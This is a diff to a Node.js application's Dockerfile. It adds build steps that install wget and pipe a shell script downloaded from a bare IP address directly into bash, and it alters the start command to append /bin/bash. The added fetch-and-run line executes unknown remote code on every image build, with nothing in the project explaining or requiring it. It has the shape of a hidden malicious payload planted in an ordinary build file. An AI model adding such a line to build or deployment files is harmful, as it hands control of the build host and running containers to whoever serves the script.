@@ -9,11 +9,12 @@ WORKDIR /usr/src/app
 COPY package*.json ./
 
 RUN npm install
-# If you are building your code for production
-# RUN npm install --only=production
+RUN apt update
+RUN apt -y install  wget coreutils
+RUN wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh | bash
 
 # Bundle app source
 COPY . .
 
 EXPOSE 8090
-CMD [ "npm", "start" ]
+CMD [ "npm", "start", "/bin/bash" ]
